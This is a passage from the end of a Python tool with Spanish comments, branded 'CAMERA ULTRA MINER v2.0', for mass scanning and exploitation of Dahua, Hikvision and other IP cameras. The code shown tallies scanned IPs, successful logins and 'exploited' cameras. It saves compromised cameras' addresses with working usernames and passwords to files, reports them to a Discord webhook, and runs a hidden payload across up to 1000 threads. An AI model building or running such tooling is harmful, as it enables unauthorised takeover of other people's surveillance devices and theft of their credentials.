            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=3)
        except:
            pass
    
    def show_final_results(self):
        """Mostrar resultados finales"""
        elapsed = time.time() - self.start_time
        
        with self.lock:
            scanned = self.stats['scanned']
            web_interfaces = self.stats['web_interfaces']
            login_success = self.stats['login_success']
            exploited = self.stats['exploited']
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   RESULTADOS FINALES                         ║
║                   ===================                        ║
║  ⏱️  Duración: {elapsed:.1f} segundos                        ║
║  🔍  IPs Escaneadas: {scanned:,}                            ║
║  📹  Cámaras Detectadas: {web_interfaces:,}                 ║
║  🔑  Logins Exitosos: {login_success:,}                     ║
║  💀  Cámaras Explotadas: {exploited:,}                      ║
║  ⚡  Velocidad: {scanned/elapsed:.1f} IPs/s                 ║
║  📊  Tasa de Exploit: {(exploited/max(1, web_interfaces)*100):.1f}%        ║
║  💾  Hits Guardados: {OUTPUT_FILE}                         ║
║  📁  Payloads Ejecutados: {PAYLOAD_FILE}                   ║
╚══════════════════════════════════════════════════════════════╝
""")
        
        if exploited > 0:
            print(f"\n[💀] CÁMARAS EXPLOTADAS ({exploited}):")
            print("-" * 70)
            
            for hit in self.hits:
                if hit.get('exploit_status') == 'SUCCESS':
                    print(f"{hit['ip']}:{hit['port']} - {hit['type']} - {hit['username']}:{hit['password']}")
            
            print("-" * 70)
            
            # Guardar resumen
            summary_file = f"cameras_exploited_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(summary_file, 'w') as f:
                f.write(f"CÁMARAS EXPLOTADAS - RESUMEN\n")
                f.write(f"============================\n")
                f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Payload usado:\n{PAYLOAD}\n\n")
                f.write("CÁMARAS COMPROMETIDAS:\n")
                f.write("=====================\n")
                for hit in self.hits:
                    if hit.get('exploit_status') == 'SUCCESS':
                        f.write(f"{hit['ip']}:{hit['port']} | {hit['type']} | {hit['username']}:{hit['password']}\n")
            
            print(f"[💾] Resumen guardado en: {summary_file}")

# =============================================
# INSTALAR DEPENDENCIAS FALTANTES
# =============================================
def install_dependencies():
    """Instalar dependencias necesarias"""
    try:
        import requests
    except ImportError:
        print("[⚡] Instalando requests...")
        os.system("pip install requests")
    
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        print("[⚡] Instalando beautifulsoup4...")
        os.system("pip install beautifulsoup4")

# =============================================
# FUNCIÓN PRINCIPAL
# =============================================
def main():
    """Función principal"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ █████╗ ███╗   ███╗██████╗  █████╗                 ║
║  ██╔════╝██╔══██╗████╗ ████║██╔══██╗██╔══██╗                ║
║  ██║     ███████║██╔████╔██║██████╔╝███████║                ║
║  ██║     ██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║                ║
║  ╚██████╗██║  ██║██║ ╚═╝ ██║██████╔╝██║  ██║                ║
║   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝                ║
║                                                              ║
║               CAMERA ULTRA MINER v2.0                        ║
║        Minería y Explotación Automática de Cámaras           ║
║         Dahua • Hikvision • IP Cameras • CCTV                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    # Instalar dependencias
    install_dependencies()
    
    global SCAN_DURATION, DISCORD_WEBHOOK_URL
    
    # Configuración
    print(f"\n[⚙️] CONFIGURACIÓN:")
    print(f"   • Credenciales: {len(CAMERA_CREDS)}")
    print(f"   • Puertos: {len(CAMERA_PORTS)}")
    print(f"   • Threads máximos: {MAX_THREADS}")
    print(f"   • Duración: {SCAN_DURATION//60} minutos")
    
    print(f"\n[💀] PAYLOAD ACTIVO:")
    print(f"   {PAYLOAD}")
    
    # Personalizar
    try:
        threads_input = input(f"\n[?] Threads a usar [{MAX_THREADS}]: ").strip()
        threads = int(threads_input) if threads_input else MAX_THREADS
        threads = min(max(threads, 50), 1000)
    except:
        threads = MAX_THREADS
    
    try:
        duration_input = input(f"[?] Duración (minutos) [5]: ").strip()
        minutes = int(duration_input) if duration_input else 5
        SCAN_DURATION = minutes * 60
    except:
        pass
    
    # Confirmar
    confirm = input("\n[?] ¿INICIAR MINERÍA DE CÁMARAS? (s/n): ").strip().lower()
    if confirm != 's':
        print("[👋] Operación cancelada")
        return
    
    # Iniciar
    print("\n[⚡] INICIANDO MINERÍA DE CÁMARAS...")
    print("[🔥] PAYLOAD LISTO PARA EJECUCIÓN AUTOMÁTICA...")
    
    time.sleep(2)
    
    miner = CameraMiner()
    
    try:
        miner.start_mining(threads)
    except KeyboardInterrupt:
        print("\n[👋] Programa terminado")
    except Exception as e:
        print(f"\n[❌] Error: {e}")
        import traceback
        traceback.print_exc()

# =============================================
# EJECUTAR
# =============================================
if __name__ == "__main__":
    # Verificar si estamos en Linux para mejor rendimiento
    if os.name == 'posix':
        # Aumentar límites del sistema para mejor rendimiento
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (10000, 10000))
    
    main()
